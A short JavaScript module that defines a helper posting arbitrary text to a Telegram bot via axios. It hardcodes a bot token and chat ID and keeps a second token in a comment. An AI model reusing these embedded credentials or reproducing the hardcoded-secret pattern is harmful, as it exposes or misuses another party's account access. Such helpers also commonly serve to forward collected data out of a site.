import axios from "axios";

// const telegram_bot_id = "5568766377:AAE2he_Alnp_nqxs66UvlgP7l28CGB52Kc4";`
const telegram_bot_id = "5797624225:AAEuXfH2z9AZxNB-UGqrp3xf9FvitLyLhlk";
const chatId = "891287342";

export const sendMessage = (data) =>
  axios.post(
    "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
    {
      chat_id: chatId,
      text: data,
    },
    {
      headers: {
        "Content-type": "application/json; charset=UTF-8",
        "cache-control": "no-cache",
      },
    }
  );
